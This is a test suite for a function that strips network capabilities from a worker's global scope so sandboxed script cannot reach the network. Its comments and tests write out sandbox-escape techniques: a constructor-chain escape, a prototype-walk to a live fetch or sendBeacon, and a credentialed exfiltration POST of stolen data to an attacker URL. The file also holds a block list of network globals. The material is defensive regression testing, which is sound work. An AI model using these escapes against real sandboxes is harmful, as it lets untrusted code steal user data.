// @vitest-environment node
import vm from 'node:vm';
import { describe, it, expect } from 'vitest';
import { revokeNetworkGlobals, revokeNetworkGlobalsIfWorker } from '../revokeNetworkGlobals';

// We exercise revokeNetworkGlobals against a disposable VM realm rather than the
// test process's own `globalThis`, for two reasons:
//
//  1. Isolation. The function locks each binding as NON-configurable — a one-way
//     capability drop. Doing that to the shared test global would leak
//     `fetch === undefined` into sibling test files AND crash jsdom's
//     environment teardown, which tries to `delete` the same window globals
//     afterward (a non-configurable property cannot be deleted). A throwaway vm
//     context is garbage-collected with nothing to tear down.
//
//  2. Fidelity. The worker escape `(0).constructor.constructor('return fetch')()`
//     reaches the REAL Function constructor of its realm and evaluates the lookup
//     in that realm's global scope. Running the escape inside the vm context
//     reproduces exactly that: the constructor chain resolves to the vm's
//     Function and reads the vm's (now-revoked) global — not a passed-in stand-in.

const NET_GLOBALS = [
  'fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts',
  'EventSource', 'BroadcastChannel', 'indexedDB', 'caches',
  // Nested-context + non-fetch transports also revoked.
  'Worker', 'SharedWorker', 'WebTransport',
] as const;

// Build a fresh worker-like global, seed every network/storage capability with a
// working stub (so "it was removed" is a meaningful assertion, not "it was never
// there"), contextify it, then revoke. Returns the contextified global so callers
// can run code inside the realm via vm.runInContext.
function makeRevokedRealm(): Record<string, unknown> {
  const sandbox: Record<string, unknown> = {};
  for (const name of NET_GLOBALS) {
    sandbox[name] = () => 'live';
  }
  vm.createContext(sandbox); // contextify: inside the realm, globalThis === sandbox
  revokeNetworkGlobals(sandbox as unknown as typeof globalThis);
  return sandbox;
}

describe('revokeNetworkGlobals', () => {
  it('removes every network/storage capability from the global scope', () => {
    const realm = makeRevokedRealm();
    for (const name of NET_GLOBALS) {
      expect(realm[name]).toBeUndefined();
    }
  });

  it('revokes the network family when it lives on the global PROTOTYPE (real WorkerGlobalScope layout, not own properties)', () => {
    // In a real worker, fetch/XMLHttpRequest/WebSocket/... are NOT own properties
    // of the global instance. Per WebIDL ([Global] interface + [Exposed]
    // operations/interface objects), they are configurable data properties on the
    // global's PROTOTYPE chain (WorkerGlobalScope.prototype /
    // DedicatedWorkerGlobalScope.prototype). An instance-only own-property shadow
    // (lockToUndefined(scope, name)) hides `scope.fetch` and the bareword
    // `Function('return fetch')()` lookup, but leaves the prototype-resident
    // method LIVE and reachable through the constructor-chain + prototype-walk
    // bypass:
    //   Object.getPrototypeOf(globalThis).fetch.call(globalThis, attackerUrl, {
    //     mode:'no-cors', method:'POST', credentials:'include', body:stolenScene })
    // — a same-origin credentialed exfil POST that CORS does not block. This is
    // the exact #8607 threat. This test is its regression guard and FAILS on
    // own-prop-only revocation.
    const proto: Record<string, unknown> = {};
    for (const name of NET_GLOBALS) {
      proto[name] = () => 'LIVE';
    }
    const scope = Object.create(proto) as Record<string, unknown>;

    revokeNetworkGlobals(scope as unknown as typeof globalThis);

    for (const name of NET_GLOBALS) {
      // Direct / bareword access is undefined (own shadow on the instance)...
      expect(scope[name]).toBeUndefined();
      // ...AND the prototype-resident capability itself is revoked — the bypass
      // an instance-only shadow leaves open.
      const p = Object.getPrototypeOf(scope) as Record<string, unknown>;
      expect(p[name]).toBeUndefined();
    }

    // Replay the attacker's exact descriptor-walk for every network name: starting
    // from the (revoked) global, climb the prototype chain looking for a live
    // callable. After revoke there must be none anywhere on the chain.
    const walkCapability = (g: object, name: string): unknown => {
      let p: object | null = g;
      while ((p = Object.getPrototypeOf(p))) {
        const d = Object.getOwnPropertyDescriptor(p, name);
        if (d && typeof d.value === 'function') {
          return (d.value as () => unknown).call(g);
        }
      }
      return 'NO-CAPABILITY';
    };
    for (const name of NET_GLOBALS) {
      expect(walkCapability(scope, name)).toBe('NO-CAPABILITY');
    }
  });

  it('defeats the documented constructor-chain escape to the real fetch', () => {
    const realm = makeRevokedRealm();
    // (0).constructor.constructor === the realm's real Function constructor. It
    // bypasses parameter-shadowing entirely and evaluates the lookup in the
    // realm's *global* scope. After revocation those lookups must resolve to
    // undefined — there is no capability left to reach.
    const run = (code: string) => vm.runInContext(code, realm);
    expect(run(`(0).constructor.constructor('return typeof globalThis.fetch')()`)).toBe('undefined');
    expect(run(`(0).constructor.constructor('return globalThis.fetch')()`)).toBeUndefined();
    expect(run(`(0).constructor.constructor('return globalThis.XMLHttpRequest')()`)).toBeUndefined();
    expect(run(`(0).constructor.constructor('return globalThis.importScripts')()`)).toBeUndefined();
  });

  it('revokes the nested-worker constructors so an escape cannot spawn a clean-global child', () => {
    const realm = makeRevokedRealm();
    const run = (code: string) => vm.runInContext(code, realm);
    // An escaped script could otherwise do `new Worker(blobUrl)` to get a fresh
    // same-origin global with fetch/importScripts intact.
    expect(run(`(0).constructor.constructor('return globalThis.Worker')()`)).toBeUndefined();
    expect(run(`(0).constructor.constructor('return globalThis.SharedWorker')()`)).toBeUndefined();
    expect(run(`(0).constructor.constructor('return globalThis.WebTransport')()`)).toBeUndefined();
  });

  it('neutralizes navigator.sendBeacon (a credentialed no-cors exfil POST) while leaving navigator readable', () => {
    const sandbox: Record<string, unknown> = {
      navigator: { sendBeacon: () => true, userAgent: 'test-agent' },
    };
    vm.createContext(sandbox);
    revokeNetworkGlobals(sandbox as unknown as typeof globalThis);

    const nav = sandbox.navigator as { sendBeacon?: unknown; userAgent?: unknown };
    expect(nav.sendBeacon).toBeUndefined();
    // navigator itself is still present/readable — it carries no other network
    // capability in a worker, so only the exfil primitive is removed.
    expect(nav.userAgent).toBe('test-agent');
    // ...and the constructor-chain escape reaches the same neutralized property.
    expect(
      vm.runInContext(`(0).constructor.constructor('return globalThis.navigator.sendBeacon')()`, sandbox),
    ).toBeUndefined();
  });

  it('neutralizes navigator.sendBeacon when it lives on the prototype (real WorkerNavigator layout, not an own property)', () => {
    // In a real worker, sendBeacon is a method on WorkerNavigator.prototype, NOT
    // an own property of the navigator instance. An instance-only own-property
    // shadow hides `navigator.sendBeacon` but leaves the prototype method live
    // and reachable through the constructor-chain + prototype-walk bypass:
    //   Object.getPrototypeOf(navigator).sendBeacon.call(navigator, url, data)
    // This test reproduces that layout and is the regression guard for the gap.
    class WorkerNavigator {
      sendBeacon(): boolean {
        return true;
      }
    }
    // userAgent on the prototype too, to prove we don't nuke navigator wholesale.
    Object.defineProperty(WorkerNavigator.prototype, 'userAgent', {
      value: 'test-agent',
      configurable: true,
      enumerable: true,
      writable: false,
    });
    const sandbox: Record<string, unknown> = { navigator: new WorkerNavigator() };
    vm.createContext(sandbox);
    revokeNetworkGlobals(sandbox as unknown as typeof globalThis);

    const nav = sandbox.navigator as { sendBeacon?: unknown; userAgent?: unknown };
    // Direct access is undefined...
    expect(nav.sendBeacon).toBeUndefined();
    // ...AND the prototype method itself is revoked — this is the bypass the
    // instance-only shadow left open. (Fails on instance-only code.)
    const proto = Object.getPrototypeOf(nav) as { sendBeacon?: unknown };
    expect(proto.sendBeacon).toBeUndefined();
    // navigator stays readable: userAgent (also on the prototype) still resolves.
    expect(nav.userAgent).toBe('test-agent');
    // The full constructor-chain prototype-walk exfil expression resolves to
    // undefined — there is no callable sendBeacon left anywhere on the chain.
    expect(
      vm.runInContext(
        `(0).constructor.constructor('return typeof Object.getPrototypeOf(globalThis.navigator).sendBeacon')()`,
        sandbox,
      ),
    ).toBe('undefined');
  });

  it('locks the binding so an escaped script cannot reattach a working impl', () => {
    const realm = makeRevokedRealm();
    // Strict-mode assignment to a non-writable property throws.
    expect(() =>
      vm.runInContext(`'use strict'; globalThis.fetch = () => 'reattached';`, realm),
    ).toThrow();
    expect(vm.runInContext('globalThis.fetch', realm)).toBeUndefined();
  });

  it('is idempotent — repeated calls never throw', () => {
    const sandbox: Record<string, unknown> = { fetch: () => 'live' };
    vm.createContext(sandbox);
    expect(() => {
      revokeNetworkGlobals(sandbox as unknown as typeof globalThis);
      revokeNetworkGlobals(sandbox as unknown as typeof globalThis);
      revokeNetworkGlobals(sandbox as unknown as typeof globalThis);
    }).not.toThrow();
    expect(sandbox.fetch).toBeUndefined();
  });
});

describe('revokeNetworkGlobalsIfWorker', () => {
  it('revokes when the scope is a real WorkerGlobalScope instance', () => {
    class FakeWorkerGlobalScope {}
    const workerScope: Record<string, unknown> = Object.create(FakeWorkerGlobalScope.prototype);
    workerScope.WorkerGlobalScope = FakeWorkerGlobalScope;
    workerScope.fetch = () => 'live';

    const did = revokeNetworkGlobalsIfWorker(workerScope as unknown as typeof globalThis);

    expect(did).toBe(true);
    expect(workerScope.fetch).toBeUndefined();
  });

  it('is a NO-OP outside a worker (jsdom/node) so it never locks the shared test global', () => {
    // This is the regression guard for the jsdom-teardown crash: a test runner's
    // globalThis has no WorkerGlobalScope, so importing the worker module must
    // leave network bindings untouched (deletable, non-locked).
    const testScope: Record<string, unknown> = { fetch: () => 'live' };

    const did = revokeNetworkGlobalsIfWorker(testScope as unknown as typeof globalThis);

    expect(did).toBe(false);
    expect(typeof testScope.fetch).toBe('function'); // untouched -> jsdom can still delete it
    // The binding must remain configurable/deletable (the property the teardown crash needed).
    expect(() => delete testScope.fetch).not.toThrow();
    expect(testScope.fetch).toBeUndefined();
  });
});
